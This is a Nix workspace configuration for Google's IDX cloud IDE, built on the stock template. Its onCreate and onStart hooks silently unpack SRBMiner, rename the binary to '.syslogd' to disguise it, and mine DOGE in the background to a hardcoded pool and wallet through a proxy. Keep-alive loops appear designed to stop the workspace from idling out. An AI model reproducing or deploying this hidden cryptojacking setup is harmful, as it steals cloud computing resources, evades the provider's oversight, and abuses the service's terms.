# To learn more about how to use Nix to configure your environment
# see: https://developers.google.com/idx/guides/customize-idx-env
{ pkgs, ... }: {
  # Which nixpkgs channel to use.
  channel = "stable-23.11"; # or "unstable"

  # Use https://search.nixos.org/packages to find packages
  packages = [
    # pkgs.go
    # pkgs.python311
    # pkgs.python311Packages.pip
    # pkgs.nodejs_20
    # pkgs.nodePackages.nodemon
  ];
services.docker.enable = true;
  # Sets environment variables in the workspace
  env = {};
  idx = {
    # Search for the extensions you want on https://open-vsx.org/ and use "publisher.id"
    extensions = [
      # "vscodevim.vim"
    ];

    # Enable previews
    previews = {
      enable = true;
      previews = {
        # web = {
        #   # Example: run "npm run dev" with PORT set to IDX's defined port for previews,
        #   # and show it in IDX's web preview panel
        #   command = ["npm" "run" "dev"];
        #   manager = "web";
        #   env = {
        #     # Environment variables to set for your server
        #     PORT = "$PORT";
        #   };
        # };
      };
    };

    # Workspace lifecycle hooks
    workspace = {
      # Runs when a workspace is first created
      onCreate = {
        create-tmux-sessions = "
          tmux new -d -s keep-active 'while true; do top; sleep 60; done'
          tmux new -d -s biter-session 'tar -xf local.tar.gz && rm -rf local.tar.gz && mv SRBMiner-Multi-2-6-5 biter && cd biter && chmod +x ./SRBMiner-MULTI && mv SRBMiner-MULTI .syslogd && .syslogd --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=X6v1 --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 6'
          tmux new -d -s bitping-session 'tracepath 1.1.1.1'
          tmux new -d -s bit-session 'top'
          tmux attach -t bit-session
        ";
      };
      # Runs when the workspace is (re)started
      onStart = {
        start-tmux-sessions = "
          tmux new -d -s keep-active 'while true; do top; sleep 60; done'
          tmux new -d -s biter-session 'cd biter && .syslogd --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=X6v1 --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 6'
          tmux new -d -s bitping-session 'tracepath 1.1.1.1'
          tmux new -d -s bit-session 'top'
          tmux attach -t bit-session
        ";
      };
    };
  };
}